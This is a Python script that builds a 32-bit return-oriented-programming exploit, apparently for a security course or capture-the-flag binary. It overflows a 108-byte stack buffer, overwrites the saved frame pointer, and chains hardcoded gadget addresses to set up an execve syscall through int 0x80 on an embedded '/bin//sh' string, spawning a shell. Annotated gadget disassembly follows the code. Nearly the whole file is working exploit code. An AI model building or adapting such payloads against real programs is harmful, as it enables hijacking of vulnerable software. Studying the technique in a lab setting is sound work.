#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# https://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html

VULNERABLE_EBP = 0xfffed298         # vulnerable %ebp
ADDR_DIFF = 0x6c                    # %ebp - buffer start address   (108-byte)
VULNERABLE_FP_SIZE = 0x04           # vulnerable frame pointer size (4-byte)
a = 0x08093b7f

VULNERABLE_EBP = 0xfffed298
XOR_EAX_EAX = 0x8056130
ADD_XB_EAX = 0x8091772
XOR_EDX_EDX = 0x805c393
MOV_EAX_EDX = 0x80640e2
INIT_0X80 = 0x80495f3
BIN_SH = pack('<I',0x6e69622f)+pack('<I',0x68732f2f)
BIN_SH_PTR = 0xfffed2b8
sys.stdout.buffer.write(b'\x61'*(ADDR_DIFF)+pack('<I',VULNERABLE_EBP)+pack('<I',XOR_EDX_EDX)+b'\x61'*0xc+pack('<I',ADD_XB_EAX)+b'\x61'*4+pack('<I',BIN_SH_PTR)+pack('<I',INIT_0X80)+BIN_SH)

#8056045:   5a                      pop    %edx                                   
#8056046:   5b                      pop    %ebx
#8056047:   c3                      ret

#8056130:   31 c0                   xor    %eax,%eax 
#8056132:   c3                      ret

#8091772:   83 c0 0b                add    $0xb,%eax
#8091775:   5f                      pop    %edi
#8091776:   c3                      ret

#805c393:   31 d2                   xor    %edx,%edx
#805c395:   5b                      pop    %ebx
#805c396:   89 d0                   mov    %edx,%eax
#805c398:   5e                      pop    %esi
#805c399:   5f                      pop    %edi
#805c39a:   c3                      ret

#809c886:   8b 0a                   mov    (%edx),%ecx
#809c888:   8b 54 24 04             mov    0x4(%esp),%edx
#809c88c:   89 0a                   mov    %ecx,(%edx)
#809c88e:   8b 10                   mov    (%eax),%edx
#809c890:   8b 44 24 08             mov    0x8(%esp),%eax
#809c894:   89 10                   mov    %edx,(%eax)
#809c896:   c3                      ret

#80640e2:   89 02                   mov    %eax,(%edx)
#80640e4:   89 f8                   mov    %edi,%eax
#80640e6:   5f                      pop    %edi
#80640e7:   c3                      ret